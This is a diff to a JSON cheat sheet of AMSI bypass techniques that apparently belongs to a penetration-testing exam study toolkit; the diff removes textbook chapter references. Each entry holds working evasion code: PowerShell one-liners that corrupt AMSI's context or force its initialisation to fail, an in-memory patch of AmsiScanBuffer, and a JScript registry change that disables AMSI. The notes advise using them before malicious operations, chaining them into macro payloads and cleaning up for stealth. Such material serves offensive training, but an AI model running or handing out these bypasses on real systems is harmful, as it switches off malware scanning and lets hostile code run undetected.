@@ -19,7 +19,7 @@
       ],
       "command": "[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'}|%{[IntPtr]$ptr=$_.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes(0),0,$ptr,4)}}",
       "variables": [],
-      "notes": "Syntax:\nPaste directly into PowerShell session before executing AMSI-flagged code Test multiple bypass methods in lab before exam.\n\nContext corruption works on most Windows 10 1809-1909 builds.\n\nAlways have backup method ready.\n\nTime estimate:\n30 seconds References:\ndocs/av-evasion/amsi-bypass.md#context-corruption, PEN-300 Chapter 7.3.1 Manual alternative:\nUse obfuscation techniques, execute from non-AMSI context (cmd.exe -> powershell -EncodedCommand), or use alternate scripting languages (Python, compiled binaries)",
+      "notes": "Syntax:\nPaste directly into PowerShell session before executing AMSI-flagged code Test multiple bypass methods in lab before exam.\n\nContext corruption works on most Windows 10 1809-1909 builds.\n\nAlways have backup method ready.\n\nTime estimate:\n30 seconds References:\ndocs/av-evasion/amsi-bypass.md#context-corruption Manual alternative:\nUse obfuscation techniques, execute from non-AMSI context (cmd.exe -> powershell -EncodedCommand), or use alternate scripting languages (Python, compiled binaries)",
       "success_indicators": [
         "No output indicates success. Subsequent AMSI checks will return E_INVALIDARG and allow execution."
       ],
@@ -46,7 +46,7 @@
       ],
       "command": "[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*InitFailed'}|%{$_.SetValue($null,$true)}}",
       "variables": [],
-      "notes": "Syntax:\nExecute before AMSI-flagged operations Faster than context corruption but potentially less reliable.\n\nGood for quick tests.\n\nCombine with obfuscation for better results.\n\nTime estimate:\n15 seconds References:\ndocs/av-evasion/amsi-bypass.md#initialization-bypass, PEN-300 Chapter 7.3.2 Manual alternative:\nUse PowerShell constrained language mode bypass, alternate execution contexts (runspaces), or compiled .NET assemblies",
+      "notes": "Syntax:\nExecute before AMSI-flagged operations Faster than context corruption but potentially less reliable.\n\nGood for quick tests.\n\nCombine with obfuscation for better results.\n\nTime estimate:\n15 seconds References:\ndocs/av-evasion/amsi-bypass.md#initialization-bypass Manual alternative:\nUse PowerShell constrained language mode bypass, alternate execution contexts (runspaces), or compiled .NET assemblies",
       "success_indicators": [
         "No output. AMSI will report initialization failure and skip subsequent scans."
       ],
@@ -72,7 +72,7 @@
       ],
       "command": "$Win32=@\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\nAdd-Type $Win32\n$lib=[Win32]::LoadLibrary(\"amsi.dll\")\n$addr=[Win32]::GetProcAddress($lib,\"AmsiScanBuffer\")\n$p=0\n[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)\n$patch=[Byte[]](0x48,0x31,0xC0,0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,4)",
       "variables": [],
-      "notes": "Syntax:\nExecute complete script in PowerShell session Most reliable across Windows versions.\n\nWorks even when other methods are patched.\n\nTakes 1-2 minutes to type if needed.\n\nSave as .ps1 file for quick deployment.\n\nTime estimate:\n2 minutes (manual typing) or 10 seconds (pre-staged file) References:\ndocs/av-evasion/amsi-bypass.md#memory-patching, PEN-300 Chapter 7.4 Manual alternative:\nUse DLL injection, process hollowing, or execute payloads from unmanaged memory contexts (C/C++ loaders)",
+      "notes": "Syntax:\nExecute complete script in PowerShell session Most reliable across Windows versions.\n\nWorks even when other methods are patched.\n\nTakes 1-2 minutes to type if needed.\n\nSave as .ps1 file for quick deployment.\n\nTime estimate:\n2 minutes (manual typing) or 10 seconds (pre-staged file) References:\ndocs/av-evasion/amsi-bypass.md#memory-patching Manual alternative:\nUse DLL injection, process hollowing, or execute payloads from unmanaged memory contexts (C/C++ loaders)",
       "success_indicators": [
         "[+] AMSI patched successfully (if using verbose version). Silent operation indicates success."
       ],
@@ -158,7 +158,7 @@
       ],
       "command": "var sh = new ActiveXObject(\"WScript.Shell\");\nvar key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\";\ntry {\n    var val = sh.RegRead(key);\n    if(val != 0) {\n        sh.RegWrite(key, 0, \"REG_DWORD\");\n    }\n} catch(e) {\n    sh.RegWrite(key, 0, \"REG_DWORD\");\n}\nWScript.Echo(\"AMSI disabled for WSH\");",
       "variables": [],
-      "notes": "Syntax:\nAdd to .js file before malicious operations Useful for Office macro chains (VBA -> WScript -> JScript -> Payload).\n\nPersistent across reboots until key is removed.\n\nClean up for stealth.\n\nTime estimate:\n30 seconds References:\ndocs/av-evasion/amsi-bypass.md#jscript-bypass, PEN-300 Chapter 7.6 Manual alternative:\nExecute JScript from non-AMSI context, use COM objects instead of WScript, or compile to executable with JScript.NET",
+      "notes": "Syntax:\nAdd to .js file before malicious operations Useful for Office macro chains (VBA -> WScript -> JScript -> Payload).\n\nPersistent across reboots until key is removed.\n\nClean up for stealth.\n\nTime estimate:\n30 seconds References:\ndocs/av-evasion/amsi-bypass.md#jscript-bypass Manual alternative:\nExecute JScript from non-AMSI context, use COM objects instead of WScript, or compile to executable with JScript.NET",
       "success_indicators": [
         "Registry key set, AMSI disabled for current user's WSH sessions"
       ],
